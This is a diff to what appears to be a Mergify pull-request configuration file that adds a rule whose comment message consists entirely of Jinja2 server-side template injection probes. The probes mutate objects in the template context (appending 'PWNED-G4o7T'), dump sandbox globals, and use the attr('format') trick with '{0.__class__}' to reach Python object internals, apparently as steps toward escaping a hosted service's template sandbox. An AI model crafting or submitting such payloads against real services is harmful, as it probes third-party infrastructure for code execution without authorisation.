@@ -1,1 +1,16 @@
-pull_request_rules: []
+pull_request_rules:
+  - name: ssti-v17-mut-2894
+    conditions: []
+    actions:
+      comment:
+        message: |
+          === G4o7T v17 MUTATION + ORACLE ===
+          [M0] files-before: {{ '%r' | format(files) }}
+          [M1] files-append-result: {{ files.append('PWNED-G4o7T') }}
+          [M2] files-after: {{ '%r' | format(files) }}
+          [M3] dict-mutate: {% set d = {'a':1} %}{% set _ = d.update({'pwn':'yes'}) %}{{ '%r' | format(d) }}
+          [M4] ns-mutate: {% set ns = namespace() %}{% set ns.x = 'PWN' %}{{ ns.x }}
+          [O1] dict-with-fns-repr: {{ '%r' | format({'lip': lipsum, 'cyc': cycler}) }}
+          [O2] tuple-globals-repr: {{ '%r' | format((lipsum, cycler, joiner, namespace, range)) }}
+          [O3] attr-format-call: {{ ('hi' | attr('format'))('world') }}
+          [O4] attr-format-class: {{ ('{0.__class__}' | attr('format'))(lipsum) }}
